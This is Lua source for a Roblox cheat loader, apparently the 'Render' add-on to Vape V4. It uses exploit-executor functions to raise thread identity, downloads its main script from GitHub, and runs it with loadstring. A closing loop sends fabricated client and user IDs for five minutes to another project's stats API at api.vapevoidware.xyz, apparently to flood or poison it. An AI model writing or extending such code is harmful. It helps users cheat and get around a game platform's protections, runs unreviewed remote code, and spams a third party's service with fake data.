local cloneref = cloneref or function(service) return service end;
local getservice = function(service) return cloneref(game:FindService(service)) end;
local errorPopupShown = false
local setidentity = syn and syn.set_thread_identity or set_thread_identity or setidentity or setthreadidentity or function() end
local getidentity = syn and syn.get_thread_identity or get_thread_identity or getidentity or getthreadidentity or function() return 8 end;
local executor = (identifyexecutor or getexecutorname or get_executor_name or function() return 'shit sploit' end)();
local clonefunc = clonefunction or clonefunc or function(func) return func end;
local httprequest = clonefunc(request or http and http.request or syn and syn.request or http_request or function() 
	return error('❌ Render - Your exploit doesn\'t have the needed functions to load.') 
end);
local rawhttpget = clonefunc(game.HttpGetAsync);
local httpget = function(...)
	return rawhttpget(game, ...)
end;
local isfile = isfile or function(file)
	local suc, res = pcall(function() return readfile(file) end)
	return suc and res ~= nil
end
local delfile = delfile or function(file) writefile(file, "") end

local function displayErrorPopup(text, func)
	local oldidentity = getidentity()
	setidentity(8)
	local ErrorPrompt = getrenv().require(getservice("CoreGui").RobloxGui.Modules.ErrorPrompt)
	local prompt = ErrorPrompt.new("Default")
	prompt._hideErrorCode = true
	local gui = Instance.new("ScreenGui", getservice("CoreGui"))
	prompt:setErrorTitle("Vape")
	prompt:updateButtons({{
		Text = "OK",
		Callback = function() 
			prompt:_close() 
			if func then func() end
		end,
		Primary = true
	}}, 'Default')
	prompt:setParent(gui)
	prompt:_open(text)
	setidentity(oldidentity)
end

local function vapeGithubRequest(scripturl)
	if not isfile("vape/"..scripturl) then
		local suc, res
		task.delay(15, function()
			if not res and not errorPopupShown then 
				errorPopupShown = true
				displayErrorPopup("The connection to github is taking a while, Please be patient.")
			end
		end)
		suc, res = pcall(function() return game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/"..readfile("vape/commithash.txt").."/"..scripturl, true) end)
		if not suc or res == "404: Not Found" then
			displayErrorPopup("Failed to connect to github : vape/"..scripturl.." : "..res)
			error(res)
		end
		if scripturl:find(".lua") then res = "--This watermark is used to delete the file if its cached, remove it to make the file persist after commits.\n"..res end
		writefile("vape/"..scripturl, res)
	end
	return readfile("vape/"..scripturl)
end;

local moverequired, moduleresult = pcall(require, getservice('Players').LocalPlayer.PlayerScripts:WaitForChild('PlayerModule'));
if moverequired == false or typeof(moduleresult) ~= 'table' then 
	getgenv().cheatenginetrash = true;
end;

if executor:lower():find('appleware') or executor:lower():find('cubix') then 
	getgenv().http_get = function(url, ...) 
        if url:find('renderintents.lol') and url:find('ria=') then
            url = url..'&appleware=true';
        end;
        return httpget(url, ...)
	end;
else
	getgenv().http_get = function(url, ...)
		if url:find('renderintents.lol') then 
			return httprequest({Url = url, Method = 'GET', Headers = {connect = 'RENSOCKET10'}}).Body
		end;
		return httpget(url, ...)
	end;
end;

local loaduifetched, loaduiapi = pcall(function()
	return loadfile('vape/Render/lib/loadui.lua')()
end);

local wasloading;
if typeof(loaduiapi) == 'table' and not shared.VapeExecuted then 
	task.spawn(function()
		task.wait(0.35);
		loaduiapi:init();
		repeat 
			if getgenv().rendervapeload then 
				wasloading = true;
				loaduiapi:setprogress(rendervapeload.step, 4, 'Loading '..getgenv().rendervapeload.file..'.lua', executor:lower():find('solara') and 'Solara may take 22-35 seconds to load render due to poop exploit.' or executor:find('wave') and 'Your screen may freeze for 5 seconds due to wave being poop.');
			else 
				if wasloading then 
					return loaduiapi.instance:Destroy()
				end;
			end
			task.wait()
		until false
	end);
end;

task.spawn(function()
    repeat task.wait() until shared.VapeFullyLoaded
    local lastsend = tick();
    local fakeid = tonumber(math.random(1, 1000000000));
    local tab = {"solara", "fluxus", "macsploit", "hydrogen", "wave", "codex", "arceus", "delta", "vega", "cubix", "celery", "cryptic", "cacti", "appleware", "synapse", "salad"}
    repeat 
        task.spawn(function()
            local id = getservice('HttpService'):GenerateGUID(false);
            clonefunction(request)({
                Url = 'https://api.vapevoidware.xyz/create_id',
                Method = 'POST',
                Headers = {
                    ['Content-type'] = 'application/json',
                    Authorization = 'Bearer blankwontddosthis:3'
                },
                Body = getservice('HttpService'):JSONEncode({['client_id'] = id, ['user_id'] = fakeid})
            });
            local data = {
                ["client_id"] = id, 
                ["executor"] = tab[math.random(1, #tab)],
                ['user_id'] = fakeid,
                ['voidware_id'] = 'github'
            }
            local final_data = game:GetService("HttpService"):JSONEncode(data)
            local url = "https://api.vapevoidware.xyz/stats/data/add"
            local a = clonefunction(request)({
                Url = url,
                Method = 'POST',
                Headers = {
                    ['Content-type'] = 'application/json',
                    Authorization = 'Bearer blankwontddosthis:3'
                },
                Body = getservice('HttpService'):JSONEncode(data)
            })
            print(a.StatusCode)
        end)
        task.wait()
    until ((tick() - lastsend) > 300)
end);

getgenv().rendervapeload = {file = 'MainScript.lua', step = 1};
return loadstring(vapeGithubRequest("MainScript.lua"))()